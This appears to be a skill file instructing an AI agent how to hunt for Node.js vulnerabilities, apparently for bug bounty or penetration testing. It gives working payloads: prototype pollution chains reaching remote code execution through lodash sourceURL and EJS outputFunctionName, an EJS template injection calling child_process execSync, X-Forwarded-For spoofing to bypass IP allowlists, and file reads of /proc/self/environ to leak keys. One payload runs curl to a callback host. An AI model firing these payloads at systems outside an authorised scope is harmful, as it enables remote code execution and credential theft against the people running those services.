---
name: hunt-nodejs
description: Node.js security hunting — prototype pollution reaching sinks (lodash merge, EJS outputFunctionName, NODE_OPTIONS, execArgv), Express trust proxy bypass, SSTI in EJS/Pug/Handlebars, child_process injection endpoints, LFI to /proc/self. Use when X-Powered-By: Express, Node stack, JSON merge/update endpoints, or package.json exposure detected. Trigger keywords: Node.js, prototype pollution, Express, trust proxy, EJS SSTI, child_process.
---

# Node.js — Deep Hunting

## THE GATE
Crown jewel: **Prototype pollution reaching a sink = Critical RCE.**

## Attack Vectors
- **Prototype pollution** via `{"__proto__":...}` / `{"constructor":{"prototype":...}}` through JSON body or `qs`-style query (`?__proto__[x]=y`) on merge/update/settings endpoints (lodash.merge, Object.assign).
- **RCE sinks**: pollute `__proto__.shell`+`NODE_OPTIONS: --require /proc/self/fd/0` or `--inspect=COLLAB` for child_process; lodash `sourceURL` (CVE-2021-23337); EJS `outputFunctionName`; `execArgv:["--eval","..."]`.
- **Express `trust proxy`**: spoof `X-Forwarded-For: 127.0.0.1` / `10.0.0.1` to bypass IP allowlists and rate limits.
- **SSTI**: EJS `<%= process.mainModule.require("child_process").execSync("id") %>`; Pug `- var x = root.process`; Handlebars prototype-pollution chain via `#with`/`split`.
- **`child_process` injection** in `/api/ping`, `/api/convert`, `/api/exec`-style endpoints.
- **LFI** → `/proc/self/environ`, `/proc/self/cmdline` leaks env/cloud keys.

## Key Payloads
`{"__proto__":{"sourceURL":"\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}`; `{"__proto__":{"outputFunctionName":"x;...execSync(\"curl COLLAB\");x"}}`.

## Fingerprinting
`X-Powered-By: Express`; `Cannot GET` errors; exposed `/package.json`/`package-lock.json`/`node_modules/.package-lock.json`.

## Validation
Pollution proven only when a marker key appears in later responses without being sent; RCE via OOB callback; trust-proxy claim needs demonstrated allowlist/rate-limit bypass.

## Common Mistakes
Stopping at 200 on `__proto__` without reaching a sink; claiming SSTI on `7*7` without RCE chain or clear render path; overclaiming trust-proxy without impact.